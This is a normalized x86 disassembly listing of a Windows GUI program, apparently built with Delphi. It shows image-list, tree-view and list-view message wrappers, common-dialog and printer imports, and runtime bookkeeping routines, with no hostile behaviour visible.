jmp sub_40363c
sub_428d94
jmp sub_40363c
sub_428dc8
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_428d54
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_428de0
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424d18
retn
mov [ eax + 0x30 ] edx
retn
sub_428df8
retn
sub_428dfc
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_424d18
retn
mov [ eax + 0x2c ] edx
retn
sub_428e3c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424d18
pop ebp
retn 0x4
sub_428e50
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_424d18
pop ebp
retn 0x4
sub_429010
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42901c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4290c9
jmp sub_4038f0
sub_4290d0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4291bb
jmp sub_40363c
sub_429227
jmp sub_4038f0
sub_429355
jmp sub_4038f0
sub_42935c
pop ebp
retn
sub_42945c
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_429491
jmp sub_4038f0
sub_429498
pop ebp
retn
sub_42949c
sub [ rw-data ] 0x1
retn
sub_4296e4
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4182a8
retn
sub_429718
mov eax [ eax + 0x4 ]
call sub_41814c
retn
sub_429749
jmp sub_4038f0
sub_429750
pop ebp
retn
sub_429754
sub [ rw-data ] 0x1
retn
InitCommonControls
jmp [ __import_lookup_table_12(comctl32:InitCommonControls) ]
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
sub_42983c
shl eax 0x8
retn
ImageList_Remove
jmp [ __import_lookup_table_12(comctl32:ImageList_Remove) ]
ImageList_BeginDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_BeginDrag) ]
ImageList_EndDrag
jmp [ __import_lookup_table_12(comctl32:ImageList_EndDrag) ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_4298e4
push ecx
push edx
push 0x1212
push eax
call SendMessageA
retn
sub_4298f4
shl eax 0xc
retn
sub_4298f8
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1100
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429910
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1101
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429928
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x1101
push ebx
call SendMessageA
pop ebx
retn
sub_429980
push 0x0
push 0x0
push 0x1105
push eax
call SendMessageA
retn
sub_429990
push 0x0
push 0x0
push 0x1106
push eax
call SendMessageA
retn
sub_4299a0
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1107
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_4299f0
mov ecx 0x4
call sub_4299d4
retn
sub_429a08
mov ecx 0x2
call sub_4299d4
retn
sub_429a14
mov ecx 0x3
call sub_4299d4
retn
sub_429a20
mov ecx 0x5
xor edx edx
call sub_4299d4
retn
sub_429a30
mov ecx 0x6
call sub_4299d4
retn
sub_429a3c
mov ecx 0x7
call sub_4299d4
retn
sub_429a48
mov ecx 0x9
xor edx edx
call sub_4299d4
retn
sub_429a58
mov ecx 0x8
xor edx edx
call sub_4299d4
retn
sub_429a68
xor ecx ecx
xor edx edx
call sub_4299d4
retn
sub_429aa8
mov ecx 0x5
call sub_429a74
retn
sub_429ab4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x110c
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429acc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x110d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429ae4
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x110f
push ebx
call SendMessageA
pop ebx
retn
sub_429af8
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1111
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429b10
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1112
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429b44
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x111d
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429b5c
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x111e
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429b74
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1002
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429b8c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
push esi
push 0x1004
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429ba4
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1006
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429bbc
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push 0x0
push 0x1009
push ebx
call SendMessageA
pop esi
pop ebx
retn
sub_429bf0
push edx
push 0x0
push 0x100f
push eax
call SendMessageA
retn
sub_429c1c
push 0x0
push edx
push 0x1014
push eax
call SendMessageA
retn
sub_429c51
jmp sub_4038f0
sub_429c58
pop ebp
retn
sub_429c5c
sub [ rw-data ] 0x1
retn
sub_429d23
jmp sub_4038f0
sub_429d2a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a340
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_429d4c
mov [ rw-data ] sub_429e64
mov [ rw-data ] sub_429dd4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42a068
mov [ rw-data ] sub_42a13c
mov [ rw-data ] sub_42a210
retn
sub_42a3d1
jmp sub_4038f0
sub_42a3d8
pop ebp
retn
sub_42a3dc
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42a340
sub_42a411
jmp sub_4038f0
sub_42a418
pop ebp
retn
sub_42a41c
sub [ rw-data ] 0x1
retn
sub_42a6ab
add eax 0xffffffd4
jmp sub_42b1d8
sub_42a6b3
add eax 0xffffffd4
jmp sub_42b234
sub_42a6c5
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40582c
sub_42a6cf
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405840
sub_42a85e
jmp sub_4038f0
sub_42a865
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42aa75
jmp sub_4038f0
sub_42aa7c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac31
jmp sub_4038f0
sub_42ac96
jmp sub_4038f0
sub_42ac9d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ad89
jmp sub_4038f0
sub_42ad90
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42afa0
lea eax [ ebp - 0x30 ]
call sub_403eec
lea eax [ ebp - 0x20 ]
call sub_403eec
retn
sub_42afb1
jmp sub_4038f0
j_sub_42afa0
jmp sub_42afa0
sub_42afb8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b0b3
jmp sub_4038f0
sub_42b0ba
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b1b7
jmp sub_4038f0
sub_42b1be
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b21e
lea eax [ ebp - 0x4 ]
call sub_405758
retn
sub_42b227
jmp sub_4038f0
j_sub_42b21e
jmp sub_42b21e
sub_42b22e
pop ebx
pop ecx
pop ebp
retn
sub_42b2c9
jmp sub_4038f0
sub_42b2d0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42b2dc
mov eax [ eax + 0x20 ]
retn
sub_42b40b
jmp sub_4038f0
sub_42b412
pop ebp
retn
sub_42b414
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_13(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_42b461
jmp sub_4038f0
sub_42b468
pop ebp
retn
sub_42b46c
sub [ rw-data ] 0x1
retn
sub_42b71b
jmp sub_4038f0
sub_42b722
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_42b902
jmp sub_4038f0
sub_42b909
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b975
jmp sub_4038f0
sub_42b97c
pop ecx
pop ecx
pop ebp
retn
sub_42bc93
jmp sub_4038f0
sub_42bc9a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42bca4
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42befc
sub_42be97
jmp sub_4038f0
sub_42bea8
jmp sub_40363c
sub_42beeb
jmp sub_4038f0
sub_42bef2
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c099
jmp sub_4038f0
sub_42c0d9
jmp sub_4038f0
sub_42c0e0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c138
add eax 0x8
call sub_40cfec
retn
sub_42c144
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42b72c
mov [ rw-data ] eax
sub_42c195
jmp sub_4038f0
sub_42c19c
pop ebp
retn
sub_42c1a0
sub [ rw-data ] 0x1
retn
sub_42c4ad
jmp sub_4038f0
sub_42c4b4
pop ebp
retn
sub_42c4b8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42c204
sub_42c598
retn
sub_42c60c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42c618
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42c624
mov edx [ eax ]
call [ edx ]
retn
sub_42c62c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42c659
jmp sub_4038f0
sub_42c660
pop ebp
retn
sub_42c664
sub [ rw-data ] 0x1
retn
sub_42c823
jmp sub_4038f0
sub_42c82a
pop ebp
retn
sub_42cbdf
jmp sub_4038f0
sub_42cbe6
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42d000
jmp sub_4038f0
sub_42d007
pop ebp
retn
sub_42d00c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c59c
mov [ rw-data ] eax
sub_42d04d
jmp sub_4038f0
sub_42d054
pop ebp
retn
sub_42d058
sub [ rw-data ] 0x1
retn
sub_42d085
jmp sub_4038f0
sub_42d08c
pop ebp
retn
sub_42d090
sub [ rw-data ] 0x1
retn
sub_42d0bd
jmp sub_4038f0
sub_42d0c4
pop ebp
retn
sub_42d0c8
sub [ rw-data ] 0x1
retn
sub_42d0f5
jmp sub_4038f0
sub_42d0fc
pop ebp
retn
sub_42d100
sub [ rw-data ] 0x1
retn
sub_42d12d
jmp sub_4038f0
sub_42d134
pop ebp
retn
sub_42d138
sub [ rw-data ] 0x1
retn
sub_42d165
jmp sub_4038f0
sub_42d16c
pop ebp
retn
sub_42d170
sub [ rw-data ] 0x1
retn
sub_42d19d
jmp sub_4038f0
sub_42d1a4
pop ebp
retn
sub_42d1a8
sub [ rw-data ] 0x1
retn
ChooseColorA
jmp [ __import_lookup_table_14(comdlg32:ChooseColorA) ]
FindTextA
jmp [ FindTextA@IAT ]
ReplaceTextA
jmp [ ReplaceTextA@IAT ]
PrintDlgA
jmp [ PrintDlgA@IAT ]
sub_42d1fd
jmp sub_4038f0
sub_42d204
pop ebp
retn
sub_42d208
sub [ rw-data ] 0x1
retn
sub_42d235
jmp sub_4038f0
sub_42d23c
pop ebp
retn
sub_42d240
sub [ rw-data ] 0x1
retn
sub_42e212
jmp sub_40363c
sub_42e217
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e234
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_42e23c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403370
pop esi
retn
sub_42e254
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403370
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42e26c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_42e315
jmp sub_4038f0
sub_42e343
jmp sub_4038f0
sub_42e34a
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e354
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42e368
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42e48d
jmp sub_4038f0
sub_42e494
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e55a
jmp sub_4038f0
sub_42e561
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e63c
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42e740
jmp sub_4038f0
sub_42e7bc
jmp sub_4038f0
sub_42e7c3
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42e84e
jmp sub_4038f0
sub_42e977
jmp sub_4038f0
sub_42e97e
pop ecx
pop ebp
retn 0x8
sub_42ed70
jmp sub_40363c
sub_42f098
call sub_403174
retn
sub_42f420
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_42f434
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0xac ]
mov ecx 0x100
call sub_40415c
pop esi
pop ebx
retn
sub_42f450
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42f468
mov eax [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_42f49c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
lea edx [ ebx + 0x1ac ]
mov ecx 0x100
call sub_40415c
pop esi
pop ebx
retn
sub_42f4b8
push ebx
add esp 0xfffffff8
mov ebx eax
mov edx esp
mov eax ebx
call sub_42f468
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebx
retn
sub_42f5b2
add [ eax ] al
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_42f89a
jmp sub_4038f0
sub_42f8a1
pop ebp
retn
sub_4304c9
jmp [ edx ]
sub_430c64
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_430c6c
mov eax [ eax + 0x16c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_430c78
mov eax [ eax + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_430c84
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_430d62
jmp sub_40363c
sub_430e1b
jmp sub_4038f0
sub_430e22
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430e38
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_430d9c
sub_430e48
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_430d9c
pop ebp
retn 0x8
sub_430e60
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_4310fd
jmp sub_40363c
sub_431270
retn
sub_4313fd
jmp sub_4038f0
sub_431480
push ebx
mov ebx eax
mov eax ebx
call sub_44f6f0
mov eax ebx
call sub_431274
pop ebx
retn
sub_431494
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_44fe10
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_4315bc
pop ebx
retn
sub_4315ac
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_431685
jmp sub_4038f0
sub_43168c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4316d4
push ebx
mov ebx eax
mov eax ebx
call sub_453378
mov eax ebx
call sub_431274
pop ebx
retn
sub_4316e8
push ebx
mov ebx eax
mov eax ebx
call sub_44404c
mov eax ebx
call sub_431274
pop ebx
retn
sub_4316fc
mov al 0x1
retn
sub_431700
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_431e33
jmp sub_4038f0
sub_431ea0
jmp sub_4038f0
sub_431fbc
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_431ee8
pop ebx
retn
sub_432108
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_4324b7
retn
sub_4324b8
jmp sub_4038f0
j_sub_4324b7
jmp sub_4324b7
sub_4324bf
pop ebp
retn
sub_4324c4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c74
mov eax [ r-xdata ]
call sub_4178dc
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_417928
sub_432569
jmp sub_4038f0
sub_432570
pop ebp
retn
sub_432574
sub [ rw-data ] 0x1
retn
sub_4325ad
jmp sub_4038f0
sub_4325b4
pop ebp
retn
sub_4325b8
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_432634
retn
sub_432635
jmp sub_4038f0
j_sub_432634
jmp sub_432634
sub_43263c
pop ebp
retn
sub_432640
sub [ rw-data ] 0x1
retn
sub_432648
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403174
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_43270c
jmp sub_4038f0
sub_432713
pop ebp
retn
sub_432718
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_432664
call sub_403cc0
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402b80
sub_432765
jmp sub_4038f0
sub_43276c
pop ebp
retn
sub_432770
sub [ rw-data ] 0x1
retn
sub_4327cc
jmp sub_4038f0
sub_4327d3
pop ebp
retn
sub_4327d8
sub [ rw-data ] 0x1
retn
sub_432834
jmp sub_4038f0
sub_43283b
pop ebp
retn
sub_432840
sub [ rw-data ] 0x1
retn
sub_4328a1
jmp sub_4038f0
sub_4328a8
pop ebp
retn
sub_4328ac
sub [ rw-data ] 0x1
retn
sub_4328f8
jmp sub_4038f0
sub_4328ff
pop ebp
retn
sub_432904
sub [ rw-data ] 0x1
retn
sub_432931
jmp sub_4038f0
sub_432938
pop ebp
retn
sub_43293c
sub [ rw-data ] 0x1
retn
sub_4370f8
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov edx 0x8000
mov eax r-xdata
call sub_40d0b8
mov [ rw-data ] eax
cmp [ rw-data ] 0x20
ja r-xdata
xor eax eax
mov [ rw-data ] eax
sub_437294
cmp dl [ eax + 0x24 ]
je r-xdata
retn
mov [ eax + 0x24 ] dl
mov [ eax + 0x25 ] 0x0
xor edx edx
call sub_418f30
sub_4372a8
mov al [ eax + 0x25 ]
xor al 0x1
retn
sub_4372b0
cmp dl [ eax + 0x25 ]
je r-xdata
retn
mov [ eax + 0x25 ] dl
call sub_4372c0
sub_4372f8
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_437310
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x24 ] 0x1
je r-xdata
mov al 0x1
retn
sub_43734c
cmp dl [ eax + 0x1c ]
je r-xdata
retn
mov [ eax + 0x1c ] dl
xor edx edx
call sub_418f30
sub_43737c
mov ecx [ eax + 0x14 ]
cmp edx ecx
jge r-xdata
cmp edx 0x2710
jle r-xdata
mov edx ecx
mov [ eax + 0x18 ] edx
mov edx [ eax + 0x10 ]
call sub_4373f4
retn
mov edx 0x2710
sub_4373a0
test edx edx
jge r-xdata
mov ecx [ eax + 0x18 ]
cmp edx ecx
jle r-xdata
xor edx edx
mov [ eax + 0x14 ] edx
mov edx [ eax + 0x10 ]
call sub_4373f4
retn
mov edx ecx
sub_4373bc
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
xor edx edx
call sub_418f30
sub_43743c
cmp edx [ eax + 0x20 ]
je r-xdata
retn
mov [ eax + 0x20 ] edx
xor edx edx
call sub_418f30
sub_437490
or ecx 0xffffffff
xor edx edx
call sub_4374e0
retn
sub_4374b0
mov eax [ eax + 0x18 ]
retn
sub_437758
jmp sub_4038f0
sub_43787a
jmp sub_4038f0
sub_437881
mov eax [ ebp - 0x4 ]
call sub_4511b8
pop ecx
pop ecx
pop ebp
retn
sub_437a36
jmp sub_4038f0
sub_437ad4
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_437af4
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_437b40
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_4513bc
sub_437b54
cmp dl [ eax + 0x221 ]
je r-xdata
retn
mov [ eax + 0x221 ] dl
call sub_4513bc
sub_437b68
cmp dl [ eax + 0x22c ]
je r-xdata
retn
mov [ eax + 0x22c ] dl
call sub_4513bc
sub_437b7c
cmp dl [ eax + 0x222 ]
je r-xdata
retn
mov [ eax + 0x222 ] dl
call sub_4513bc
sub_437b90
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_437e3d
jmp sub_4038f0
sub_437e44
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop esi
mov esp ebp
pop ebp
retn
sub_437fea
jmp sub_4038f0
sub_4383d6
jmp sub_4038f0
sub_4383f3
jmp sub_4038f0
sub_438404
push ebx
mov ebx eax
mov eax ebx
call sub_4522f8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_438654
jmp sub_4038f0
sub_43865b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43867e
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_4050ac
retn
sub_438677
jmp sub_4038f0
sub_43867e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4386e0
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
sub_438738
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_43744c
retn
sub_438e83
jmp sub_4038f0
sub_438e90
mov ecx edx
mov dl 0x1
call sub_438da0
retn
sub_438e9c
mov ecx edx
xor edx edx
call sub_438da0
retn
sub_438ea8
mov dl 0x4
call sub_438a54
retn
sub_438f84
mov ecx edx
mov dl 0x3
call sub_438ae8
retn
sub_438f90
xor edx edx
call sub_438a54
retn
sub_438fb8
mov dl 0x1
call sub_438a54
retn
sub_439068
mov dl 0x2
call sub_438a54
retn
sub_4391e4
test edx edx
je r-xdata
xor eax eax
retn
mov eax edx
call sub_4390e4
retn
sub_4393be
jmp sub_4038f0
sub_4393c5
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43958c
jmp sub_4038f0
sub_439593
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43971a
jmp sub_4038f0
sub_4397bc
push edx
xor ecx ecx
xor edx edx
call sub_4397c8
retn
sub_439864
cmp [ eax + 0x24 ] 0x0
jne r-xdata
retn
call sub_403174
sub_439a2c
jmp sub_4038f0
sub_439a33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439b78
mov eax [ eax + 0x4 ]
call sub_453e1c
retn
sub_439b84
mov eax edx
call sub_439864
retn
sub_439c02
jmp sub_4038f0
sub_439c09
pop ecx
pop ecx
pop ebp
retn
sub_439c10
push ecx
push 0x0
push 0x2
xor ecx ecx
xchg edx ecx
call sub_439c30
retn
sub_439c20
push ecx
push 0x0
push 0x0
xor ecx ecx
xchg edx ecx
call sub_439c30
retn
sub_439d9f
jmp sub_40363c
sub_439dcc
jmp sub_4038f0
sub_439dd3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_439e54
mov [ edx + 0x25 ] 0x1
mov [ ecx ] 0x27
mov [ ecx + 0x24 ] edx
mov [ ecx + 0x10 ] 0xffffffff
mov [ ecx + 0x18 ] 0xffffffff
mov [ ecx + 0x1c ] 0xffffffff
retn
sub_439fdd
jmp sub_4038f0
sub_439fe4
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a020
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43a038
sub_43a06c
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
call sub_43a038
sub_43a0fc
jmp sub_4038f0
sub_43a2b5
jmp sub_4038f0
sub_43a2bc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43a40c
xor edx edx
mov [ eax + 0xc ] edx
retn
sub_43a935
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a06c
retn
sub_43a944
jmp sub_4038f0
j_sub_43a935
jmp sub_43a935
sub_43ab79
jmp sub_4038f0
sub_43ac81
jmp sub_40363c
sub_43ac86
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43acc4
push ebx
mov ebx eax
mov eax ebx
call sub_453434
cmp [ ebx + 0x209 ] 0x1
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_4513bc
sub_43ad30
push edx
xor ecx ecx
xor edx edx
call sub_43ad3c
retn
sub_43adec
cmp dl [ eax + 0x208 ]
je r-xdata
retn
mov [ eax + 0x208 ] dl
mov ecx edx
mov edx 0x400
call sub_437178
sub_43ae08
cmp dl [ eax + 0x22d ]
je r-xdata
retn
mov [ eax + 0x22d ] dl
mov ecx edx
mov edx 0x200
call sub_437178
sub_43ae24
cmp dl [ eax + 0x247 ]
je r-xdata
retn
mov [ eax + 0x247 ] dl
mov ecx edx
mov edx 0x1000
call sub_437178
sub_43ae40
cmp dl [ eax + 0x268 ]
je r-xdata
retn
mov [ eax + 0x268 ] dl
mov ecx edx
xor cl 0x1
mov edx 0x80
call sub_437178
sub_43ae9c
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_4513bc
sub_43aed8
